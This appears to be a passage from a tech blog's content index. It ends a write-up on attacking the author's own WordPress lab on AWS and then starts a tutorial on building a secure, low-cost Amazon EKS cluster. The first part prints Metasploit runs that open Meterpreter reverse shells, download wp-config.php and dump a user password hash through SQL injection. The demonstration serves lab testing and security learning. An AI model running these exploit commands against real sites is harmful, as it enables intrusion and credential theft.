Processing stdin for ERB directives. resource (stdin)&gt; use exploit/multi/http/wp_backup_migration_php_filter [*] Using configured payload php/meterpreter/reverse_tcp resource (stdin)&gt; set rhost http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com rhost =&gt; http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com resource (stdin)&gt; set lhost 18.185.154.248 lhost =&gt; 18.185.154.248 resource (stdin)&gt; set lport 443 lport =&gt; 443 resource (stdin)&gt; run --no-interact [*] Exploiting target 18.158.31.183 [-] Handler failed to bind to 18.185.154.248:443:- - [*] Started reverse TCP handler on 0.0.0.0:443 [*] Running automatic check (\"set AutoCheck false\" to disable) [*] WordPress Version: 6.5.3 [+] Detected Backup Migration Plugin version: 1.3.7 [+] The target appears to be vulnerable. [*] Writing the payload to disk, character by character, please wait... [*] Sending stage (39927 bytes) to 3.71.92.221 [+] Deleted Y [+] Deleted pLqV.php [*] Meterpreter session 1 opened (10.192.10.69:443 -&gt; 3.71.92.221:40930) at 2024-06-01 18:18:03 +0000 [*] Session 1 created in the background. [*] Exploiting target 18.194.82.16 [-] Handler failed to bind to 18.185.154.248:443:- - [*] Started reverse TCP handler on 0.0.0.0:443 [*] Running automatic check (\"set AutoCheck false\" to disable) [*] WordPress Version: 6.5.3 [+] Detected Backup Migration Plugin version: 1.3.7 [+] The target appears to be vulnerable. [*] Writing the payload to disk, character by character, please wait... [*] Sending stage (39927 bytes) to 3.71.92.221 [+] Deleted d [+] Deleted pLqV.php [*] Meterpreter session 2 opened (10.192.10.69:443 -&gt; 3.71.92.221:35022) at 2024-06-01 18:19:07 +0000 [*] Session 2 created in the background. resource (stdin)&gt; sessions --interact 1 --meterpreter-command ps --meterpreter-command sysinfo --meterpreter-command \"download /bitnami/wordpress/wp-config.php\" [*] Running 'ps' on meterpreter session 1 (18.158.31.183) Process List ============ PID Name User Path --- ---- ---- ---- 1 /bin/sh 1001 /bin/sh -c /opt/copilot/scripts/startup.sh 8 /bin/sh 1001 /bin/sh /opt/copilot/scripts/startup.sh 15 /managed-agents/execute-command/amazon-ssm-agent root /managed-agents/execute-command/amazon-ssm-agent 30 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 60 /managed-agents/execute-command/ssm-agent-worker root /managed-agents/execute-command/ssm-agent-worker 345 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 346 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 347 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 348 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 349 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 350 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 352 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 406 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 407 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 408 /opt/bitnami/apache/bin/httpd 1001 /opt/bitnami/apache/bin/httpd -f /opt/bitnami/apache/conf/httpd.conf -D FOREGROUND 419 sh 1001 sh -c ps ax -w -o pid,user,cmd --no-header 2&gt;/dev/null 420 ps 1001 ps ax -w -o pid,user,cmd --no-header [*] Running 'sysinfo' on meterpreter session 1 (18.158.31.183) Computer : ip-10-0-0-38.eu-central-1.compute.internal OS : Linux ip-10-0-0-38.eu-central-1.compute.internal 5.10.215-203.850.amzn2.x86_64 #1 SMP Tue Apr 23 20:32:19 UTC 2024 x86_64 Meterpreter : php/linux [*] Running 'download /bitnami/wordpress/wp-config.php' on meterpreter session 1 (18.158.31.183) [*] Downloading: /bitnami/wordpress/wp-config.php -&gt; /home/kali/wp-config.php [*] Downloaded 4.28 KiB of 4.28 KiB (100.0%): /bitnami/wordpress/wp-config.php -&gt; /home/kali/wp-config.php [*] Completed : /bitnami/wordpress/wp-config.php -&gt; /home/kali/wp-config.php resource (stdin)&gt; use auxiliary/scanner/http/wp_loginizer_log_sqli resource (stdin)&gt; set rhost http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com rhost =&gt; http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com resource (stdin)&gt; set verbose true verbose =&gt; true resource (stdin)&gt; run [*] Checking /wp-content/plugins/loginizer/readme.txt [*] Found version 1.6.3 in the plugin [+] Vulnerable version of Loginizer detected [*] {SQLi} Executing (select group_concat(JC) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) JC from wp_users limit 1) JIVez) [*] {SQLi} Time-based injection: expecting output of length 44 [+] wp_users ======== user_login user_pass ---------- --------- wordpress $P$B8OjOUCRrPXm/TrVQ2/WJqUp5w7WmI. [*] Scanned 1 of 2 hosts (50% complete) [*] Checking /wp-content/plugins/loginizer/readme.txt [*] Found version 1.6.3 in the plugin [+] Vulnerable version of Loginizer detected [*] Scanned 1 of 2 hosts (50% complete) [*] {SQLi} Executing (select group_concat(TXChHXg) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) TXChHXg from wp_users limit 1) fA) [*] Scanned 1 of 2 hosts (50% complete) [*] Scanned 1 of 2 hosts (50% complete) [*] Scanned 1 of 2 hosts (50% complete) [*] {SQLi} Time-based injection: expecting output of length 44 [+] wp_users ======== user_login user_pass ---------- --------- wordpress $P$B8OjOUCRrPXm/TrVQ2/WJqUp5w7WmI. [*] Scanned 2 of 2 hosts (100% complete) [*] Auxiliary module execution completed resource (stdin)&gt; exit -y From the outputs above, you can see the attack against WordPress was successful. We obtained details about the remote system, such as a list of processes, the wp-config.php file, system details, and a list of users with their password hashes. Cleanup Delete the Amazon EKS cluster, EC2 instances, VPCs, EC2 Key Pair, DB snapshots, SSM parameters, and CloudWatch Log Groups: export AWS_REGION=\"eu-central-1\" export AWS_EC2_KEY_PAIR_NAME=\"wordpress-test\" export SOLUTION_KALI=\"KaliLinux-NICE-DCV\" export SOLUTION_EC2_CONTAINER=\"Amazon-EC2-Container\" export SOLUTION_EC2=\"Amazon-EC2\" aws cloudformation delete-stack --stack-name \"${SOLUTION_KALI}\" aws cloudformation delete-stack --stack-name \"${SOLUTION_EC2_CONTAINER}\" aws cloudformation delete-stack --stack-name \"${SOLUTION_EC2}\" aws cloudformation delete-stack --stack-name \"${SOLUTION_KALI}-VPC\" aws cloudformation delete-stack --stack-name \"${SOLUTION_EC2_CONTAINER}-VPC\" aws cloudformation delete-stack --stack-name \"${SOLUTION_EC2}-VPC\" aws ec2 delete-key-pair --key-name \"${AWS_EC2_KEY_PAIR_NAME}\" for FILE in ${TMP_DIR}/{vpc_cloudformation_template.yml,KaliLinux-NICE-DCV.yaml,UbuntuLinux-2204-LAMP-server.yaml,AmazonLinux-2023-LAMP-server.yaml,${AWS_EC2_KEY_PAIR_NAME}.pem,wordpress_plugin_install.sh,Dockerfile,startup.sh}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done if copilot app ls | grep wordpress; then copilot app delete --name wordpress --yes if [[ -d \"${TMP_DIR}/copilot\" ]]; then rm -rf \"${TMP_DIR}/copilot\" fi fi if aws ssm get-parameter --name /copilot/wordpress/dev/secrets/WORDPRESS_USERNAME; then aws ssm delete-parameter --name /copilot/wordpress/dev/secrets/WORDPRESS_USERNAME fi if aws ssm get-parameter --name /copilot/wordpress/dev/secrets/WORDPRESS_PASSWORD; then aws ssm delete-parameter --name /copilot/wordpress/dev/secrets/WORDPRESS_PASSWORD fi aws logs describe-log-groups --log-group-name-prefix /aws/lambda/wordpress-dev-wordpress --query 'logGroups[*].logGroupName' | jq -r '.[]' | xargs -I {} aws logs delete-log-group --log-group-name {} aws rds describe-db-cluster-snapshots --query \"DBClusterSnapshots[?starts_with(DBClusterSnapshotIdentifier, \\`wordpress-dev-wordpress\\`) == \\`true\\`].DBClusterSnapshotIdentifier\" | jq -r '.[]' | xargs -I {} aws rds delete-db-cluster-snapshot --db-cluster-snapshot-identifier {} Enjoy ‚Ä¶ üòâ" }, { "title": "Build secure and cheap Amazon EKS with Pod Identities", "url": "/posts/secure-cheap-amazon-eks-with-pod-identities/", "categories": "Kubernetes, Amazon EKS, Security, EKS Pod Identities", "tags": "amazon eks, k8s, kubernetes, security, eksctl, cert-manager, external-dns, podinfo, prometheus, sso, oauth2-proxy, metrics-server, eks pod identities", "date": "2024-05-03 00:00:00 +0200", "content": "I will outline the steps for setting up an Amazon EKS environment that is both cost-effective and prioritizes security, including the configuration of standard applications. The Amazon EKS setup should align with the following cost-effectiveness criteria: Utilize two Availability Zones (AZs), or a single zone if possible, to reduce payments for cross-AZ traffic Spot instances Less expensive region - us-east-1 Most price efficient EC2 instance type t4g.medium (2 x CPU, 4GB RAM) using AWS Graviton based on ARM Use Bottlerocket OS for a minimal operating system, CPU, and memory footprint Use Network Load Balancer (NLB) as a most cost efficient + cost optimized load balancer Karpenter to enable automatic node scaling that matches the specific resource requirements of pods The Amazon EKS setup should also meet the following security requirements: The Amazon EKS control plane must be encrypted using KMS Worker node EBS volumes must be encrypted Cluster logging to CloudWatch must be configured Network Policies should be enabled where supported EKS Pod Identities should be used to allow applications and pods to communicate with AWS APIs Build Amazon EKS cluster Requirements You will need to configure the AWS CLI and set up other necessary secrets and variables. # AWS Credentials export AWS_ACCESS_KEY_ID=\"xxxxxxxxxxxxxxxxxx\" export AWS_SECRET_ACCESS_KEY=\"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\" export AWS_SESSION_TOKEN=\"xxxxxxxx\" export AWS_ROLE_TO_ASSUME=\"arn:aws:iam::7xxxxxxxxxx7:role/Gixxxxxxxxxxxxxxxxxxxxle\" export GOOGLE_CLIENT_ID=\"10xxxxxxxxxxxxxxxud.apps.googleusercontent.com\" export GOOGLE_CLIENT_SECRET=\"GOxxxxxxxxxxxxxxxtw\" If you plan to follow this document and its tasks, you will need to set up a few environment variables, such as: # AWS Region export AWS_REGION=\"${AWS_REGION:-us-east-1}\" # Hostname / FQDN definitions export CLUSTER_FQDN=\"${CLUSTER_FQDN:-k01.k8s.mylabs.dev}\" # Base Domain: k8s.mylabs.dev export BASE_DOMAIN=\"${CLUSTER_FQDN#*.}\" # Cluster Name: k01 export CLUSTER_NAME=\"${CLUSTER_FQDN%%.*}\" export MY_EMAIL=\"petr.ruzicka@gmail.com\" export TMP_DIR=\"${TMP_DIR:-${PWD}}\" export KUBECONFIG=\"${KUBECONFIG:-${TMP_DIR}/${CLUSTER_FQDN}/kubeconfig-${CLUSTER_NAME}.conf}\" # Tags used to tag the AWS resources export TAGS=\"${TAGS:-Owner=${MY_EMAIL},Environment=dev,Cluster=${CLUSTER_FQDN}}\" export AWS_PARTITION=\"aws\" AWS_ACCOUNT_ID=$(aws sts get-caller-identity --query \"Account\" --output text) &amp;&amp; export AWS_ACCOUNT_ID mkdir -pv \"${TMP_DIR}/${CLUSTER_FQDN}\" Confirm that all essential variables have been properly configured: : \"${AWS_ACCESS_KEY_ID?}\" : \"${AWS_REGION?}\" : \"${AWS_SECRET_ACCESS_KEY?}\" : \"${AWS_ROLE_TO_ASSUME?}\" : \"${GOOGLE_CLIENT_ID?}\" : \"${GOOGLE_CLIENT_SECRET?}\" echo -e \"${MY_EMAIL} | ${CLUSTER_NAME} | ${BASE_DOMAIN} | ${CLUSTER_FQDN}\\n${TAGS}\" Install the required tools: You can bypass these procedures if you already have all the essential software installed. AWS CLI eksctl kubectl helm Configure AWS Route 53 Domain delegation The DNS delegation tasks should be executed as a one-time operation. Create a DNS zone for the EKS clusters: export CLOUDFLARE_EMAIL=\"petr.ruzicka@gmail.com\" export CLOUDFLARE_API_KEY=\"1xxxxxxxxx0\" aws route53 create-hosted-zone --output json \\ --name \"${BASE_DOMAIN}\" \\ --caller-reference \"$(date)\" \\ --hosted-zone-config=\"{\\\"Comment\\\": \\\"Created by petr.ruzicka@gmail.com\\\", \\\"PrivateZone\\\": false}\" | jq Route53 k8s.mylabs.dev zone Utilize your domain registrar to update the nameservers for your zone (e.g., mylabs.dev) to point to Amazon Route 53 nameservers. Here‚Äôs how to discover the required Route 53 nameservers: NEW_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${BASE_DOMAIN}.\\`].Id\" --output text) NEW_ZONE_NS=$(aws route53 get-hosted-zone --output json --id \"${NEW_ZONE_ID}\" --query \"DelegationSet.NameServers\") NEW_ZONE_NS1=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[0]\") NEW_ZONE_NS2=$(echo \"${NEW_ZONE_NS}\" | jq -r \".[1]\") Establish the NS record in k8s.mylabs.dev (your BASE_DOMAIN) for proper zone delegation. This operation‚Äôs specifics may vary based on your domain registrar; I use Cloudflare and employ Ansible for automation: ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS1} solo=true proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" ansible -m cloudflare_dns -c local -i \"localhost,\" localhost -a \"zone=mylabs.dev record=${BASE_DOMAIN} type=NS value=${NEW_ZONE_NS2} solo=false proxied=no account_email=${CLOUDFLARE_EMAIL} account_api_token=${CLOUDFLARE_API_KEY}\" localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-885.awsdns-46.net\", \"created_on\": \"2020-11-13T06:25:32.18642Z\", \"id\": \"dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:32.18642Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": \"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } localhost | CHANGED =&gt; { \"ansible_facts\": { \"discovered_interpreter_python\": \"/usr/bin/python\" }, \"changed\": true, \"result\": { \"record\": { \"content\": \"ns-1692.awsdns-19.co.uk\", \"created_on\": \"2020-11-13T06:25:37.605605Z\", \"id\": \"9xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb\", \"locked\": false, \"meta\": { \"auto_added\": false, \"managed_by_apps\": false, \"managed_by_argo_tunnel\": false, \"source\": \"primary\" }, \"modified_on\": \"2020-11-13T06:25:37.605605Z\", \"name\": \"k8s.mylabs.dev\", \"proxiable\": false, \"proxied\": false, \"ttl\": 1, \"type\": \"NS\", \"zone_id\": \"2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxe\", \"zone_name\": \"mylabs.dev\" } } } CloudFlare mylabs.dev zone Create the service-linked role Creating the service-linked role for Spot Instances is a one-time operation. Create the AWSServiceRoleForEC2Spot role to use Spot Instances in the Amazon EKS cluster: aws iam create-service-linked-role --aws-service-name spot.amazonaws.com Details: Work with Spot Instances Create Route53 zone, KMS key and Karpenter infrastructure Generate a CloudFormation template that defines an Amazon Route 53 zone and an AWS Key Management Service (KMS) key. The CloudFormation template below also includes the Karpenter CloudFormation resources. Add the new domain CLUSTER_FQDN to Route 53, and set up DNS delegation from the BASE_DOMAIN. tee \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms-karpenter.yml\" &lt;&lt; \\EOF AWSTemplateFormatVersion: 2010-09-09 Description: Route53 entries and KMS key Parameters: BaseDomain: Description: \"Base domain where cluster domains + their subdomains will live - Ex: k8s.mylabs.dev\" Type: String ClusterFQDN: Description: \"Cluster FQDN (domain for all applications) - Ex: k01.k8s.mylabs.dev\" Type: String ClusterName: Description: \"Cluster Name - Ex: k01\" Type: String Resources: HostedZone: Type: AWS::Route53::HostedZone Properties: Name: !Ref ClusterFQDN RecordSet: Type: AWS::Route53::RecordSet Properties: HostedZoneName: !Sub \"${BaseDomain}.\" Name: !Ref ClusterFQDN Type: NS TTL: 60 ResourceRecords: !GetAtt HostedZone.NameServers # https://karpenter.sh/docs/reference/cloudformation/ KarpenterNodeInstanceProfile: Type: \"AWS::IAM::InstanceProfile\" Properties: InstanceProfileName: !Sub \"eksctl-${ClusterName}-karpenter-node-instance-profile\" Path: \"/\" Roles: - Ref: \"KarpenterNodeRole\" KarpenterNodeRole: Type: AWS::IAM::Role Properties: RoleName: !Sub \"eksctl-${ClusterName}-karpenter-node-role\" Path: / AssumeRolePolicyDocument: Version: \"2012-10-17\" Statement: - Effect: Allow Principal: Service: !Sub \"ec2.${AWS::URLSuffix}\" Action: - \"sts:AssumeRole\" ManagedPolicyArns: - !Sub \"arn:${AWS::Partition}:iam::aws:policy/AmazonEKS_CNI_Policy\" - !Sub \"arn:${AWS::Partition}:iam::aws:policy/AmazonEKSWorkerNodePolicy\" - !Sub \"arn:${AWS::Partition}:iam::aws:policy/AmazonEC2ContainerRegistryReadOnly\" - !Sub \"arn:${AWS::Partition}:iam::aws:policy/AmazonSSMManagedInstanceCore\" KarpenterControllerPolicy: Type: AWS::IAM::ManagedPolicy Properties: ManagedPolicyName: !Sub \"eksctl-${ClusterName}-karpenter-controller-policy\" PolicyDocument: !Sub | { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Sid\": \"AllowScopedEC2InstanceAccessActions\", \"Effect\": \"Allow\", \"Resource\": [ \"arn:${AWS::Partition}:ec2:${AWS::Region}::image/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}::snapshot/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:security-group/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:subnet/*\" ], \"Action\": [ \"ec2:RunInstances\", \"ec2:CreateFleet\" ] }, { \"Sid\": \"AllowScopedEC2LaunchTemplateAccessActions\", \"Effect\": \"Allow\", \"Resource\": \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:launch-template/*\", \"Action\": [ \"ec2:RunInstances\", \"ec2:CreateFleet\" ], \"Condition\": { \"StringEquals\": { \"aws:ResourceTag/kubernetes.io/cluster/${ClusterName}\": \"owned\" }, \"StringLike\": { \"aws:ResourceTag/karpenter.sh/nodepool\": \"*\" } } }, { \"Sid\": \"AllowScopedEC2InstanceActionsWithTags\", \"Effect\": \"Allow\", \"Resource\": [ \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:fleet/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:instance/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:volume/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:network-interface/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:launch-template/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:spot-instances-request/*\" ], \"Action\": [ \"ec2:RunInstances\", \"ec2:CreateFleet\", \"ec2:CreateLaunchTemplate\" ], \"Condition\": { \"StringEquals\": { \"aws:RequestTag/kubernetes.io/cluster/${ClusterName}\": \"owned\" }, \"StringLike\": { \"aws:RequestTag/karpenter.sh/nodepool\": \"*\" } } }, { \"Sid\": \"AllowScopedResourceCreationTagging\", \"Effect\": \"Allow\", \"Resource\": [ \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:fleet/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:instance/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:volume/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:network-interface/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:launch-template/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:spot-instances-request/*\" ], \"Action\": \"ec2:CreateTags\", \"Condition\": { \"StringEquals\": { \"aws:RequestTag/kubernetes.io/cluster/${ClusterName}\": \"owned\", \"ec2:CreateAction\": [ \"RunInstances\", \"CreateFleet\", \"CreateLaunchTemplate\" ] }, \"StringLike\": { \"aws:RequestTag/karpenter.sh/nodepool\": \"*\" } } }, { \"Sid\": \"AllowScopedResourceTagging\", \"Effect\": \"Allow\", \"Resource\": \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:instance/*\", \"Action\": \"ec2:CreateTags\", \"Condition\": { \"StringEquals\": { \"aws:ResourceTag/kubernetes.io/cluster/${ClusterName}\": \"owned\" }, \"StringLike\": { \"aws:ResourceTag/karpenter.sh/nodepool\": \"*\" }, \"ForAllValues:StringEquals\": { \"aws:TagKeys\": [ \"karpenter.sh/nodeclaim\", \"Name\" ] } } }, { \"Sid\": \"AllowScopedDeletion\", \"Effect\": \"Allow\", \"Resource\": [ \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:instance/*\", \"arn:${AWS::Partition}:ec2:${AWS::Region}:*:launch-template/*\" ], \"Action\": [ \"ec2:TerminateInstances\", \"ec2:DeleteLaunchTemplate\" ], \"Condition\": { \"StringEquals\": { \"aws:ResourceTag/kubernetes.io/cluster/${ClusterName}\": \"owned\" }, \"StringLike\": { \"aws:ResourceTag/karpenter.sh/nodepool\": \"*\" } } }, { \"Sid\": \"AllowRegionalReadActions\", \"Effect\": \"Allow\", \"Resource\": \"*\", \"Action\": [ \"ec2:DescribeAvailabilityZones\", \"ec2:DescribeImages\", \"ec2:DescribeInstances\", \"ec2:DescribeInstanceTypeOfferings\", \"ec2:DescribeInstanceTypes\", \"ec2:DescribeLaunchTemplates\", \"ec2:DescribeSecurityGroups\", \"ec2:DescribeSpotPriceHistory\", \"ec2:DescribeSubnets\" ], \"Condition\": { \"StringEquals\": { \"aws:RequestedRegion\": \"${AWS::Region}\" } } }, { \"Sid\": \"AllowSSMReadActions\", \"Effect\": \"Allow\", \"Resource\": \"arn:${AWS::Partition}:ssm:${AWS::Region}::parameter/aws/service/*\", \"Action\": \"ssm:GetParameter\" }, { \"Sid\": \"AllowPricingReadActions\", \"Effect\": \"Allow\", \"Resource\": \"*\", \"Action\": \"pricing:GetProducts\" }, { \"Sid\": \"AllowInterruptionQueueActions\", \"Effect\": \"Allow\", \"Resource\": \"${KarpenterInterruptionQueue.Arn}\", \"Action\": [ \"sqs:DeleteMessage\", \"sqs:GetQueueUrl\", \"sqs:ReceiveMessage\" ] }, { \"Sid\": \"AllowPassingInstanceRole\", \"Effect\": \"Allow\", \"Resource\": \"${KarpenterNodeRole.Arn}\", \"Action\": \"iam:PassRole\", \"Condition\": { \"StringEquals\": { \"iam:PassedToService\": \"ec2.amazonaws.com\" } } }, { \"Sid\": \"AllowScopedInstanceProfileCreationActions\", \"Effect\": \"Allow\", \"Resource\": \"*\", \"Action\": [ \"iam:CreateInstanceProfile\" ], \"Condition\": { \"StringEquals\": { \"aws:RequestTag/kubernetes.io/cluster/${ClusterName}\": \"owned\", \"aws:RequestTag/topology.kubernetes.io/region\": \"${AWS::Region}\" }, \"StringLike\": { \"aws:RequestTag/karpenter.k8s.aws/ec2nodeclass\": \"*\" } } }, { \"Sid\": \"AllowScopedInstanceProfileTagActions\", \"Effect\": \"Allow\", \"Resource\": \"*\", \"Action\": [ \"iam:TagInstanceProfile\" ], \"Condition\": { \"StringEquals\": { \"aws:ResourceTag/kubernetes.io/cluster/${ClusterName}\": \"owned\", \"aws:ResourceTag/topology.kubernetes.io/region\": \"${AWS::Region}\", \"aws:RequestTag/kubernetes.io/cluster/${ClusterName}\": \"owned\", \"aws:RequestTag/topology.kubernetes.io/region\": \"${AWS::Region}\" }, \"StringLike\": { \"aws:ResourceTag/karpenter.k8s.aws/ec2nodeclass\": \"*\", \"aws:RequestTag/karpenter.k8s.aws/ec2nodeclass\": \"*\" } } }, { \"Sid\": \"AllowScopedInstanceProfileActions\", \"Effect\": \"Allow\", \"Resource\": \"*\", \"Action\": [ \"iam:AddRoleToInstanceProfile\", \"iam:RemoveRoleFromInstanceProfile\", \"iam:DeleteInstanceProfile\" ], \"Condition\": { \"StringEquals\": { \"aws:ResourceTag/kubernetes.io/cluster/${ClusterName}\": \"owned\", \"aws:ResourceTag/topology.kubernetes.io/region\": \"${AWS::Region}\" }, \"StringLike\": { \"aws:ResourceTag/karpenter.k8s.aws/ec2nodeclass\": \"*\" } } }, { \"Sid\": \"AllowInstanceProfileReadActions\", \"Effect\": \"Allow\", \"Resource\": \"*\", \"Action\": \"iam:GetInstanceProfile\" }, { \"Sid\": \"AllowAPIServerEndpointDiscovery\", \"Effect\": \"Allow\", \"Resource\": \"arn:${AWS::Partition}:eks:${AWS::Region}:${AWS::AccountId}:cluster/${ClusterName}\", \"Action\": \"eks:DescribeCluster\" } ] } KarpenterInterruptionQueue: Type: AWS::SQS::Queue Properties: QueueName: !Sub \"${ClusterName}\" MessageRetentionPeriod: 300 SqsManagedSseEnabled: true KarpenterInterruptionQueuePolicy: Type: AWS::SQS::QueuePolicy Properties: Queues: - !Ref KarpenterInterruptionQueue PolicyDocument: Id: EC2InterruptionPolicy Statement: - Effect: Allow Principal: Service: - events.amazonaws.com - sqs.amazonaws.com Action: sqs:SendMessage Resource: !GetAtt KarpenterInterruptionQueue.Arn ScheduledChangeRule: Type: AWS::Events::Rule Properties: EventPattern: source: - aws.health detail-type: - AWS Health Event Targets: - Id: KarpenterInterruptionQueueTarget Arn: !GetAtt KarpenterInterruptionQueue.Arn SpotInterruptionRule: Type: AWS::Events::Rule Properties: EventPattern: source: - aws.ec2 detail-type: - EC2 Spot Instance Interruption Warning Targets: - Id: KarpenterInterruptionQueueTarget Arn: !GetAtt KarpenterInterruptionQueue.Arn RebalanceRule: Type: AWS::Events::Rule Properties: EventPattern: source: - aws.ec2 detail-type: - EC2 Instance Rebalance Recommendation Targets: - Id: KarpenterInterruptionQueueTarget Arn: !GetAtt KarpenterInterruptionQueue.Arn InstanceStateChangeRule: Type: AWS::Events::Rule Properties: EventPattern: source: - aws.ec2 detail-type: - EC2 Instance State-change Notification Targets: - Id: KarpenterInterruptionQueueTarget Arn: !GetAtt KarpenterInterruptionQueue.Arn KMSAlias: Type: AWS::KMS::Alias Properties: AliasName: !Sub \"alias/eks-${ClusterName}\" TargetKeyId: !Ref KMSKey KMSKey: Type: AWS::KMS::Key Properties: Description: !Sub \"KMS key for ${ClusterName} Amazon EKS\" EnableKeyRotation: true PendingWindowInDays: 7 KeyPolicy: Version: \"2012-10-17\" Id: !Sub \"eks-key-policy-${ClusterName}\" Statement: - Sid: Allow direct access to key metadata to the account Effect: Allow Principal: AWS: - !Sub \"arn:${AWS::Partition}:iam::${AWS::AccountId}:root\" Action: - kms:* Resource: \"*\" - Sid: Allow access through EBS for all principals in the account that are authorized to use EBS Effect: Allow Principal: AWS: \"*\" Action: - kms:Encrypt - kms:Decrypt - kms:ReEncrypt* - kms:GenerateDataKey* - kms:CreateGrant - kms:DescribeKey Resource: \"*\" Condition: StringEquals: kms:ViaService: !Sub \"ec2.${AWS::Region}.amazonaws.com\" kms:CallerAccount: !Sub \"${AWS::AccountId}\" Outputs: KMSKeyArn: Description: The ARN of the created KMS Key to encrypt EKS related services Value: !GetAtt KMSKey.Arn Export: Name: Fn::Sub: \"${AWS::StackName}-KMSKeyArn\" KMSKeyId: Description: The ID of the created KMS Key to encrypt EKS related services Value: !Ref KMSKey Export: Name: Fn::Sub: \"${AWS::StackName}-KMSKeyId\" KarpenterNodeRoleArn: Description: The ARN of the role used by Karpenter to launch EC2 instances Value: !GetAtt KarpenterNodeRole.Arn Export: Name: Fn::Sub: \"${AWS::StackName}-KarpenterNodeRoleArn\" KarpenterNodeInstanceProfileName: Description: The Name of the Instance Profile used by Karpenter Value: !Ref KarpenterNodeInstanceProfile Export: Name: Fn::Sub: \"${AWS::StackName}-KarpenterNodeInstanceProfileName\" KarpenterControllerPolicyArn: Description: The ARN of the policy used by Karpenter to launch EC2 instances Value: !Ref KarpenterControllerPolicy Export: Name: Fn::Sub: \"${AWS::StackName}-KarpenterControllerPolicyArn\" EOF if [[ $(aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE --query \"StackSummaries[?starts_with(StackName, \\`${CLUSTER_NAME}-route53-kms-karpenter\\`) == \\`true\\`].StackName\" --output text) == \"\" ]]; then # shellcheck disable=SC2001 eval aws cloudformation deploy --capabilities CAPABILITY_NAMED_IAM \\ --parameter-overrides \"BaseDomain=${BASE_DOMAIN} ClusterFQDN=${CLUSTER_FQDN} ClusterName=${CLUSTER_NAME}\" \\ --stack-name \"${CLUSTER_NAME}-route53-kms-karpenter\" --template-file \"${TMP_DIR}/${CLUSTER_FQDN}/aws-cf-route53-kms-karpenter.yml\" --tags \"${TAGS//,/ }\" fi AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name \"${CLUSTER_NAME}-route53-kms-karpenter\" --query \"Stacks[0].Outputs[? OutputKey==\\`KMSKeyArn\\` || OutputKey==\\`KMSKeyId\\` || OutputKey==\\`KarpenterNodeRoleArn\\` || 